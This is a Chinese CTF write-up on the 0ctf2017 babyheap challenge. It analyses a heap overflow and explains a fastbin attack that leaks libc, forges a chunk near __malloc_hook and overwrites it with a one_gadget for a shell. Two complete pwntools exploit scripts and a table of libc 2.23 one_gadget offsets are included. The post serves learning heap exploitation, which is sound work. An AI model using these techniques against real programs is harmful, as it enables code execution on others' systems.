> 原文链接: https://www.anquanke.com//post/id/168009 


# Fastbin Attack之雷霆万钧：0ctf2017 babyheap


                                阅读量   
                                **239497**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0143336a3677289bc0.png)](https://p4.ssl.qhimg.com/t0143336a3677289bc0.png)



## 本文要点概括：
- fastbin attack
- __malloc_hook与size错位构造
- 绕过calloc泄露内存的通用思想（堆块溢出“受孕”、fastbin attack利用、远交近攻“隔山打牛”）
- 边缘效应与耦合缓解（unsorted_bin中chunk再分配、清空bin环境）
- libc依赖：
- 有关不同libc版本下的堆地址
随着堆的学习，最近一直保持着有关libc堆漏洞利用的文章的更新，之前以babynote为例讲了unsorted bin attack，这次以0ctf2018 babyheap为例讲解一下fastbin attack的东西。

堆的知识细节很庞大，每次pwn一个challenge都会收获很多东西。之前是复现的babynote那道题，但毕竟是参考了别人的exp自己心里还是没底，而这次的babyheap的exploit开发则是彻头彻尾自己完成的，过程和结果令人惊喜：自己写出的有效exp之后和网上的exp进行了对比，发现思路有比较大的出入，也就意味着学到了更多的东西。

[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap)



## 一、逆向分析与漏洞挖掘

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203203512.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203203512.jpg)

丢进IDA，main函数F5，如下（函数名我已进行手动重命名）：

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203191418.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203191418.jpg)

### 0x01、new_log()如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203192049.jpg)

我们的堆块就是通过该函数分配，索引表的结构就是传统的堆题目结构，由exist字段、大小字段和用户区指针构成；值得注意的是此处使用的内存分配函数是calloc而不是malloc，calloc分配chunk时会对用户区数据进行置空，也就是说之前的fd和bk字段都会被置为0，这在进行内存泄露时会造成一定的难度；返回的chunk下标也是传统的exist字段遍历法，下标从0开始。

### 0x02、edit_log()如下：

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203192939.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203192939.jpg)

可以看到，程序并没有对用户输入的Size长度进行检查，这就造成了任意长度输入，形成堆溢出漏洞；此外，输入没有尾补字符串结束符，有可能会造成内存泄露(该程序后经分析，内存泄露不利用此处缺陷)

### 0x03、delet_log()如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203193428.jpg)

可以看到，这段free函数写的是很安全的，首先对用户通过下标选择进行free的chunk在索引表层面做了存在性检查，如果exist字段为0说明已经free便不再继续执行free，这有利于防范double free；free成功后，相应的索引表的exist字段置空、堆指针置NULL也做到位了。总之该部分没有安全漏洞。

### 0x04、print_log()如下：

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203194025.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203194025.jpg)

其中sub_130F():

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181203194307.jpg)

这个读内容函数也是安全的，首先作了存在性检查，如果exist字段为0就不会去读，也就是说只能读new过的记录；并且读取用的是write而不是puts，write读的长度也是索引表中记录的长度（即当初new的时候输入的长度的多大就只能读多大 ）

### 0x05、逆向分析小结：

该程序存在堆溢出漏洞，但是由于其他保护作的较好，在泄露内存阶段应该会遇到较大阻力；堆溢出漏洞可能带来Fastbin Attack的机会。



## 二、漏洞利用分析

在进行具体分析之前，我们先粗略讲一下fastbin attack的相关知识：

（详细讲解请参考ctf wiki上的教程）

1.fastbin是单链表，按chunk大小递增一共有好几个，用户free一个chunk以后，如果大小是属于fastbin的、又不与top chunk相邻，就链入fastbin中大小对应的单链表

2.fastbin单链表是个栈，LIFO，链表结点(被free的chunk)的插入用的是头插法，即紧邻表头插入，fd指针则往链尾方向指向下一个chunk（此处的“头尾”是以表头为头）

3.大体上插入就是chunk-&gt;fd = fastbinY[x] -&gt;fd ; fastbinY[x]-&gt;fd = chunk ;   而对应的拆卸过程就是 fastbinY[x]-&gt;fd = fastbinY[x]-&gt;fd-&gt;fd(看懂意思就好不要太较真，大家可以自行去看libc源码)

4.fastbin的相关安全检查：首块double free检查，当一个chunk被free进fastbin前，会看看链表的第一个chunk是不是该chunk，如果是，说明double free了就报错；分配前size字段校验，从fastbin表中malloc出一个chunk时，拆卸前会检查要分配的这个chunk的size字段是不是真的属于它当前所在的fastbin表，如果size字段的值不是当前fastbin表的合法chunk大小值，则报错，其代码   ((((unsigned int)(sz)) &gt;&gt; (bitl == 8 ? 4 : 3)) – 2)；根据size算得应在的表的下标，再和当前所在fastbin的下标对比

5.fastbin chunk头部字段特点：presize为0，size的inuse位恒为1（不被合并，符合当时设计常驻较小块以提高效率的初衷）

6.fastbin attack：用过一定手段篡改某堆块的fd指向一块目标内存（当然其对应size位置的值要合法），当我们malloc到此堆块后再malloc一次，自然就把目标内存分配到了，就可以对这块目标内存为所欲为了（可以是关键数据也可以是函数指针）

下面正式开始分析：

我们的主要思路就是首先泄露得到libc的基地址，然后通过fastbin attack篡改libc中某个函数指针，最终在调用的时候实现劫持并get shell

### 0x01、泄露libc_base

唯一有输出的地方就是程序的print_log()函数，只能利用这个函数泄露内存

而这个函数打印的东西都是chunk内的内容，自然想到应该是通过泄露chunk的fd和bk指针泄露libc_base地址

马上排除通过fastbin chunk泄露的可能性，因为fastbin chunk只有fd没有bk，而fd是往链尾指的而且是单链表，只能指向堆的地址，怎么也不可能指向fastbin表头，因此也无法通过偏移计算泄露libc_base

所以是通过unsorted bin来泄露libc_base！

阻碍：读的内存长度有限制，只能读当初new时输入的长度；calloc时会置空用户区数据，残存的fd和bk将被置零；chunk只有索引表exist指示存在时才能读

先考虑如何绕过calloc和exist：首先如果你要读fd和bk，就不能被置空，也就是说你读的fd和bk所在的堆块必须是free的，那么它的索引表exist肯定指示不存在不能读

所以现在看来，我们只能读exist即inuse 的堆块，又要读的出free的堆块里的内容

也就是说我们必须能够通过读一个exist即inuse 的堆块打印出某个free的堆块里的内容

要达到这个目的，唯一可能的情形就是：这个exist的堆块对应的索引表中的Size足够大，大到把某个free态的堆块也包含了进去，这样读这个exist的堆块时就可以读到free块的fd和bk

我们下面将用Size来代表这个足够大的长度值

那么这个大大的Size肯定是在new_log()之初就由用户输入了的，也就是说calloc时传入的大小就是这个Size，但是calloc时会置零，也就是说被包含进来的那个free态的堆块肯定不能是先free了再被这个exist的堆块包含进来（因为这样那个free态的堆块的fd和bk就置零没了），所以一定是calloc时还不是free的，calloc后再free掉，然后再读calloc到的堆块进行泄露

那么问题来了：calloc(Size)时如何能分配到一块包含了另一个占用态堆块的堆块呢？calloc到的堆块无非来自两种情况，要么是从bins中已有的块中直接拿出来的，要么就是从top chunk切下来的；显然，不能是从top chunk切下来的；所以是从bins中直接拿出了一个chunk，也就是说之前在bins中就已经存在这个大小为Size的chunk了（我们根据特点将这个大小为Size的堆块称作“怀孕块prgnt chunk”）

那么怎么构造这样一个bins中的prgnt chunk呢？或者说换种说法：怎么让它“怀上”肚子里的泄露目标chunk呢？有经验的pwn狗稍加思考就想到了：伪造size字段！方法自然是堆溢出！

只要能够将与“胎儿堆块”(fetus chunk)相邻的prev_chunk(即bins中的prgnt chunk)的size字段篡改的更大，大到把fetus chunk也包含进去了(也就是篡改为Size)，那么在用户以Size为输入长度通过调用new_log执行calloc(Size)的时候，就会在bins里找到我们伪造出的这个size字段值为Size的prgnt chunk，分配出来就得到一个我们所需要的大小包含了一个inuse态的fetus chunk的prgnt chunk了

calloc到prgnt chunk后，我们只需要调用edit_log()编辑prgnt chunk来把还是inuse态的fetus chunk的presize字段和size字段写成合法值（被置零了），然后free掉fetus chunk（这时候就有fd和bk了），再调用print_log()读prgnt chunk就可以读出fetus chunk的fd和bk了（即前面所提到的calloc后再free掉，然后再读calloc到的堆块进行泄露）

显然prgnt chunk与fetus chunk都必须是unsorted_bin chunk，此外还需要一个保护堆块来殿后，防止合并进top chunk，然后在最前面还需要随便放一个堆块用来发起溢出，因此一共需要四个堆块，大小都是unsorted_bin chunk就行

泄露出的是main_arena__unsorted_bin的地址，通过偏移计算即可得到libc_base

### 0x02、Fastbin Attack

先往fastbin里free一个chunk进去，溢出踩掉这个chunk的fd指针，把fd劫持到malloc_hook附近，然后连续calloc两次就得到一个指向malloc_hook附近的用户指针了，然后就可以将malloc_hook改写为我们的劫持目标地址（比如onegadget），之后再调用new_log()执行calloc的时候就可以把程序执行流劫持到onegadget然后get shell了

### 0x03、重要技术细节

hook劫持、RELRO保护、错位构造size、onegadget

往常劫持函数指针我们常常是用GOT表劫持的手段，而仅就笔者目前的了解，就至少有两种情况是GOT表劫持行不通的：一个是RELRO保护全开、一个是fastbin须size错位

RELRO是一种加强对数据段保护的技术，当其完全开启时（full），GOT表就不会采用延迟绑定，而是在程序加载之初就一次性全部绑定，此后将GOT表属性设置为不可写，这样一来就无法篡改GOT表了

size错位就是我们今天遇到的情况，前面说过fastbin的安全检查之一就是size字段校验，因此如果我们想通过劫持fd至目标内存进而分配到目标内存，就必须保证在目标内存附近能够找到一个qword能够充当合法的size字段，绕过校验，这就是我们所说的size错位构造；而实践经验证明，在GOT表内，似乎并不能找到这样一个qword来错位构造size，因此fastbin attack攻击GOT表是行不通的

因此fastbin attack中我们选择攻击hook，先来讲一下hook：hook就是钩子函数，设计钩子函数的初衷是用于调试，基本格式大体是func_hook(*func,&lt;参数&gt;)，在调用某函数时，如果函数的钩子存在，就会先去执行该函数的钩子函数，通过钩子函数再来回调我们当初要调用的函数，calloc函数与malloc函数的钩子都是malloc_hook：

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204145938.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204145938.jpg)

（libc2.23源码中malloc的定义）

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204150154.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204150154.jpg)

（IDA中的malloc的定义）

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204150453.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204150453.jpg)

（libc2.23源码中calloc的定义）

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204150643.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204150643.jpg)

（IDA中的calloc的定义）

综上四幅图可以看到，在调用malloc/calloc时，执行核心代码前都先判断了malloc_hook是否存在，如果存在的话都会先调用malloc_hook！

所以我们来看一下malloc_hook附近的内存布局：

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204151013.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204151013.jpg)

（图.hook汇编窗口）

可以看到malloc_hook紧邻main_arena

我们fastbin attack都是攻击malloc_hook，也就是说在malloc_hook附近可以错位构造出一个合法的size字段，我们到hex界面看一下这个size是怎么构造出来的：

[![](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204151401.jpg)](https://ma9p13.files.wordpress.com/2018/12/time688aae59bbe20181204151401.jpg)

从3C4AF0到3C4B18，对照“图.hook汇编窗口”，各个qword分别是：

```
_IO_wfile_jumps            align 20h

__memolign_hook         __realloc_hook

__malloc_hook               align 20h
```



我们的攻击目标就是malloc_hook即0x3C4B10，这个位置需要处于分配到的chunk的用户区中，从这个位置往上找可以错位构造size字段的qword，就只能找到0x3C4AF0和0x3C4AF8，原因如下：

因为0x3C4AF8处的align 20h是固定不变的，永远都是00 00 00 00 00 00 00 00，注意其他几个位置在图中的hex都并不是实际运行时的值，实际运行时会附上真实的地址值，有经验的话应该能猜到这几个实际运行时libc地址长度都是6字节，且最高位字节为7f，这样一来就只能找到那一个位置可以错位构造size了，就是0x3C4AF0的最高字节7f加上往后的7个字节长度的00构成一串qword：7f 00 00 00 00 00 00 00，可以作为合法size字段值！

令sz = 0x7f，令bitl = 8，((((unsigned int)(sz)) &gt;&gt; (bitl == 8 ? 4 : 3)) – 2)计算出的下标是5，因此对应chunk是属于fastbin[5]的：

```
//这里的size指用户区域
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
```

idx=5，用户区大小应为0x60，至此我们就知道进行fastbin attack时用到是哪个fastbin、请求的用户区大小应该是多少了！

关于onegadget：

onegadget就是一个特殊的gadget，只要跳到这儿执行就可以直接拿到shell，不信的话我给出几个常用的onegadget（libc2.23下的）地址，大家自己去IDA里面看：

```
0x4526a execve("/bin/sh", rsp+0x30, environ) 

constraints: 

     [rsp+0x30] == NULL 

0xcd0f3 execve("/bin/sh", rcx, r12) 

constraints: 

     [rcx] == NULL || rcx == NULL 

     [r12] == NULL || r12 == NULL 

0xcd1c8 execve("/bin/sh", rax, r12) 

constraints: 

     [rax] == NULL || rax == NULL 

     [r12] == NULL || r12 == NULL 

0xf0274 execve("/bin/sh", rsp+0x50, environ) 

constraints: 

     [rsp+0x50] == NULL 

0xf1117 execve("/bin/sh", rsp+0x70, environ) 

constraints: 

     [rsp+0x70] == NULL 

0xf66c0 execve("/bin/sh", rcx, [rbp-0xf8]) 

constraints: 

     [rcx] == NULL || rcx == NULL 

     [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
```



## 三、exploit开发

exploit完全按照上面进行的漏洞利用分析开发，因此不多说，直接贴出对应exp：

```
from pwn import *
#ARCH SETTING
context(arch = 'amd64' , os = 'linux')
#r = process('./babyheap')
r = remote('127.0.0.1',9999)

#FUNCTION DEFINE
def new(size):
   r.recvuntil("Command: ")
   r.sendline("1")
   r.recvuntil("Size: ")
   r.sendline(str(size))

def edit(idx,size,content):
   r.recvuntil("Command: ")
   r.sendline("2")
   r.recvuntil("Index: ")
   r.sendline(str(idx))
   r.recvuntil("Size: ")
   r.sendline(str(size))
   r.recvuntil("Content: ")
   r.send(content)

def delet(idx):
   r.recvuntil("Command: ")
   r.sendline("3")
   r.recvuntil("Index: ")
   r.sendline(str(idx))

def echo(idx):
   r.recvuntil("Command: ")
   r.sendline("4")
   r.recvuntil("Index: ")
   r.sendline(str(idx))

#MAIN EXPLOIT

#memory leak
#step1
new(0x90) #idx.0 to unsorted bin
new(0x90) #idx.1 to unsorted bin
new(0x90) #idx.2 to unsorted bin
new(0x90) #idx.3 for protecting top_chunk merge
delet(1)
#step2
payload_expand = 'A'*0x90 + p64(0) + p64(0x141)
edit(0,len(payload_expand),payload_expand)
#step3
new(0x130)
#step4
payload_crrct = 'A'*0x90 + p64(0) + p64(0xa1)
edit(1,len(payload_crrct),payload_crrct)
#step5
delet(2)
#step6
echo(1)
r.recvuntil("Content: n")
r.recv(0x90 + 0x10)
fd = u64( r.recv(8) )
libc_unsort = fd
libc_base = libc_unsort - 0x3c4b78

#hijack overflow
#the present idx_table has inuse logs: 0 , 1 , 3 ,wait-queue: 2 , 4 , 5 , 6 , 7 , ...
new(0x90) #idx.2 clean the heap-bins environment
new(0x10) #idx.4 for overflow
new(0x60) #idx.5 to fastbin[5] 
new(0x10) #idx.6 for protecting top_chunk merge
delet(5) #NOTICE: idx.5 recycled after here !!!
malloc_hook_fkchunk = libc_base + 0x3c4aed
payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
edit(4,len(payload_hj),payload_hj)

#hijack attack
new(0x60) #idx.5
new(0x60) #idx.7
onegadget_addr = libc_base + 0x4526a
payload_hj2onegadget = 'A'*3 + p64(0) + p64(0) + p64(onegadget_addr)
edit(7,len(payload_hj2onegadget),payload_hj2onegadget)

#fire
new(0x100)
r.interactive()
```

*注释：

1.step2就是溢出“受孕”过程，0x121就是通过溢出伪造的size字段值，0x140 = 0xa0 * 2

2.step4中的payload_crrct是将fetus chunk的pre_size和size字段写为正确合法值

3.由于fetus chunk被free后unsorted bin里实际上它自己（大家可以自己回溯exp去看），所以它的fd和bk都是指向unsorted bin表头的，因此这里泄露fd就足够了

4.#hijack overflow那里最开始new的0x90是为了清空bin环境，使所有的bins里面都没有东西（本来bins里有一个用户区大小为0x90的fetus chunk），这样再分配堆块的时候就是从top chunk往下割了，避免了从原来的bins中割一块给你：那为什么要这样呢？因为不清空bin环境exp容易出问题，本文后面将会举例说明

5.malloc_hook_fkchunk的地址计算别忘了错位构造出的size字段前还有个pre_size字段

6.’A’*3 + p64(0) + p64(0)是因为从错位构造的size字段末尾到malloc_hook直接还有0x13个字节的数据

此外，多说一句，关于堆块受孕过程，我们通过溢出伪造的size大小其实实际上只要能把fd字段包含进去就足够了，不必把整个fetus chunk都弄进去。



## 四、不同exp引发的深入思考

文章开头我说过，我们用的exploit和网上公开流行的版本用的方法并不一样，主要区别就在于泄露libc_base的原理是不同的

这里给出网上流行的经典版本exp的几个链接：

[exp_classical1](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/#_27)

[exp_classical2](https://blog.csdn.net/qq_35519254/article/details/78213962https://blog.csdn.net/qq_35519254/article/details/78213962)

经典版本exp的思路是利用了两次fastbin attack，他们泄露libc_base的就是通过第一次fastbin attack完成的，第二次fastbin attck与我们相同，也是劫持malloc_hook.

我们知道，fastbin attack就是要篡改fd指针，将fd劫持到目标内存，那么有意思的地方来了：对于相邻的几个堆块，它们的内存地址也是相邻的，也就是说它们的内存地址值有可能只有最低字节不同，其它字节都相同，那么如果我们通过溢出篡改掉fd的最低字节，就可以把fd劫持到任意堆块了！

经典版本的exp正是利用了这一点进行了fastbin attack，拿到了一个指向某个已经是占用态的堆块的用户指针（也就是说一个chunk同时有两个用户指针指向它），如果这个chunk的大小属于unsorted bin，那么就可以先free它（free的是之前的那个用户指针），然后用我们后来通过fastbin attack拿到的用户指针来泄露fd和bk，进而得到libc_base

当然，为了保证一能绕过size校验、二能进入unsorted bin，过程中还需要通过溢出来伪造合适的size字段值！

按我们之前的思路，要能够通过读一个exist即inuse 的堆块打印出某个free的堆块里的内容，必须exist的块足够大大到把fetus chunk包含进去，于是就有了溢出篡改size进行“受孕”的思路，而经典exp的思路是：要能够通过读一个exist即inuse 的堆块打印出某个free的堆块里的内容，只要有两个用户指针指向同一个堆块就可以了！

### 所以，经典exploit的缺陷在哪呢？

缺陷就是对libc版本依赖较大！

这道题目用的libc版本是libc2.23，在libc2.23中，用户分配的第一个堆块就位于堆区起始地址，也就是说用户分配的第一个堆块的地址最低字节一定是00（在目前的libc版本中，堆区的起始地址最低字节都是00），所以我们在泄露内存时能够顺利地计算出应该把fd的最低字节篡改为几

但在libc2.26的系统中，用户分配的第一个堆块并不位于堆区的起始处！而是从堆区起始地址往后偏移了很大一段距离，本人调试发现，在libc2.26中，用户分配的第一个堆块的地址最低字节是0x50！

至于出现这种情况的原因，是和libc2.26新引进的tcache机制有关，这个在以后的文章中会讲到。总之，这一点就造成了经典exp对libc版本的不兼容性更大了！



## 五、清空bins环境

之前exp提到了清空bins环境，现在来讲一下

如果不清空bins的话，fetus chunk就会留在unsorted bin里，大小为0xa0（用户区大小则为0x90），此时继续按照原来的exp流程new(0x10)、new(0x60)会发生什么呢？

把清空bins那一行去掉，那段exp就变成：

```
#hijack overflow 
#the present idx_table has inuse logs: 0 , 1 , 3 ,wait-queue: 2 , 4 , 5 , 6 , 7 , ... 
#清空bins代码new(0x90)已删除
new(0x10) #idx.2 for overflow 
new(0x60) #idx.4 to fastbin[4]  
new(0x10) #idx.5 for protecting top_chunk merge 
delet(4) #NOTICE: idx.4 recycled after here !!! 
malloc_hook_fkchunk = libc_base + 0x3c4aed 
payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
edit(4,len(payload_hj),payload_hj)
```

我们下面通过gdb调试来看到底会发生什么

***调试技巧：python脚本中加x = input(“debug”)来中断执行流，然后attach进程调试

首先在new(0x60) 后面加一行x= input(“debug”)，停到这儿的时候attach调试：

[![](https://ma9p13.files.wordpress.com/2018/12/14.jpg)](https://ma9p13.files.wordpress.com/2018/12/14.jpg)

[![](https://ma9p13.files.wordpress.com/2018/12/15.jpg)](https://ma9p13.files.wordpress.com/2018/12/15.jpg)

通过调试器来查看堆区如上，可以依次看到我们第一次溢出的溢出发起块、prgnt chunk（其size字段值为0x141），而再往下就应该是fetus chunk了，按理说fetus chunk的size字段值应该是0xa1，并且应该能看到它的fd和bk，但是调试器却显示fetus chunk那块内存似乎莫名其妙的变成了两个inuse的chunk，size字段分别是0x21和0x81，应有的fd和bk也没了！

真正的原因就是：当用户分配0x10和0x60的堆块时，由于在unsorted bin里能找到足够大的chunk，因此就没有从top chunk中去拿新的内存空间，而是直接从unsorted bin里切一块出来给用户。

那用户申请0x60的堆块对应的size字段不应该是0x71吗？为什么调试结果显示是0x81？

我的猜测是：

第一种可能性：如果你切0x70的出来，那么unsorted bin里就会剩下大小为0x10的一块，这就尴尬了，总大小为0x10意思不就是用户区大小是0吗，也就是压根没有用户区，这样当然是不合情理的，因此libc的处理就是干脆直接多分配0x10个字节，直接给0x81的chunk出来就ok了

第二种可能性：如果你切0x70的出来，那么unsorted bin里就会剩下大小为0x10的一块，这个剩余块的大小是不属于unsorted bin的，因此不应该放在unsorted bin里而应该放在fastbin里，但是考虑到效率问题，如果真的老老实实先切割出0x70的块、再把剩下的小块从unsorted bin里拿出来、再把它放到该放的fastbin里，这样下来效率就会拉低许多，libc为了提高效率就偷了个懒：如果剩余的块大小已经小到应该进fastbin，那么就直接合成一个大一些的chunk分配出来，而不移交fastbin.

### 后经深入调试证明，第一种猜测是正确的！

好，我们回到刚刚的没有清空bins的exp，把input改下在delet(4) 后面，然后重新跑起，断下时attach调试，可以看到：

[![](https://ma9p13.files.wordpress.com/2018/12/16.jpg)](https://ma9p13.files.wordpress.com/2018/12/16.jpg)

果然不出所料，进了0x80的fastbin而没进0x70的fastbin，导致exp最终不能成功get shell.

如果不想清空bins还想exp正确运行，有个比较骚的办法，就是把用于溢出的那个new(0x10)改成new(0x20)，这样大小正好，就避免了“补块”的发生



## 六、扩展：远交近攻“隔山打牛”

后来突发奇想，又想到了一种更麻烦的攻击方法，当然大同小异，不同的地方还是在泄露libc_base那里，用的方法是分配chunk1、chunk2、chunk3、chunk4、chunk5五个chunk，chunk1用于发起溢出、chunk5用于防止top_chunk merge，然后free掉chunk2，再从chunk1打一个溢出覆盖chunk2的size字段为chunk2、3、4的大小之和，再从chunk3打一个溢出覆盖chunk4的presize为chunk2、3、4的大小之和，然后free掉chunk4就可以触发堆块合并，就把chunk2、3、4合为一个堆块了，这时候calloc相应大小就可以把这个三合一堆块拿到了，然后把chunk3的presize和size写为正确值，free掉chunk3，然后读这个三合一chunk就可以泄露出chunk3的fd和bk了

之后闲着没事看ctf wiki，发现上面介绍了一个原理相同的攻击手段，叫house of einherjar，有兴趣的可以自己去看。

我们把这种方法的exp也给出来：

```
from pwn import *
#ARCH SETTING
context(arch = 'amd64' , os = 'linux')
#r = process('./babyheap')
r = remote('127.0.0.1',9999)

#FUNCTION DEFINE
def new(size):
r.recvuntil("Command: ")
r.sendline("1")
r.recvuntil("Size: ")
r.sendline(str(size))

def edit(idx,size,content):
r.recvuntil("Command: ")
r.sendline("2")
r.recvuntil("Index: ")
r.sendline(str(idx))
r.recvuntil("Size: ")
r.sendline(str(size))
r.recvuntil("Content: ")
r.send(content)

def delet(idx):
r.recvuntil("Command: ")
r.sendline("3")
r.recvuntil("Index: ")
r.sendline(str(idx))

def echo(idx):
r.recvuntil("Command: ")
r.sendline("4")
r.recvuntil("Index: ")
r.sendline(str(idx))

#MAIN EXPLOIT

#memory leak
#step1
new(0x90) #idx.0 to unsorted bin
new(0x90) #idx.1 to unsorted bin
new(0x90) #idx.2 to unsorted bin
new(0x90) #idx.3 to unsorted bin
new(0x90) #idx.4 for protect
delet(1)
print("step1")
#step2
payload_expand = 'A'*0x90 + p64(0) + p64(0x141)
edit(0,len(payload_expand),payload_expand)
print("step2")
#step3
payload_mergefk = 'A'*0x90 + p64(0x140) + p64(0xa0)
edit(2,len(payload_mergefk),payload_mergefk)
print("step3")
#step4
delet(3)
print("step4")
#step5
new(0x1d0)
print("step5")
#step6
payload_crrct = 'A'*0x90 + p64(0) + p64(0xa1) + 'A'*0x90 + p64(0) + p64(0xa1)
edit(1,len(payload_crrct),payload_crrct)
print("step6")
#step7
delet(2)
print("step7")
#step8
echo(1)
r.recvuntil("Content: n")
print(r.recv(0x90 + 0x10))
fd = u64( r.recv(8) )
libc_unsort = fd
libc_base = libc_unsort - 0x3c4b78
print("step8")
print(hex(libc_base))

#hijack overflow
#the present idx_table has inuse logs: 0 , 1 , 4 ,wait-queue: 2 , 3 , 5 , 6 , ...
new(0x90) #idx.2 clean the heap-bins environment
new(0x10) #idx.3 for overflow
new(0x60) #idx.5 to fastbin[5] 
new(0x10) #idx.6 for protect
delet(5) #NOTICE: idx.5 recycled after here !!!
#x = input("debug")
malloc_hook_fkchunk = libc_base + 0x3c4aed
payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
edit(3,len(payload_hj),payload_hj)

#hijack attack
#x = input("debug")
new(0x60) #idx.5
#x = input("debug")
new(0x60) #idx.7
#x = input("debug")
onegadget_addr = libc_base + 0x4526a
payload_hj2onegadget = 'A'*3 + p64(0) + p64(0) + p64(onegadget_addr)
edit(7,len(payload_hj2onegadget),payload_hj2onegadget)

#fire
new(0x100)
r.interactive()
```



## 七、心得总结

这道pwn最大的收获在于了解了堆漏洞泄露内存的两大主要思路：

### 1、chunk extern

堆扩张攻击，如常用的house of einherjar攻击

### 2、chunk double pointing

想办法让两个用户指针索引同一个堆块
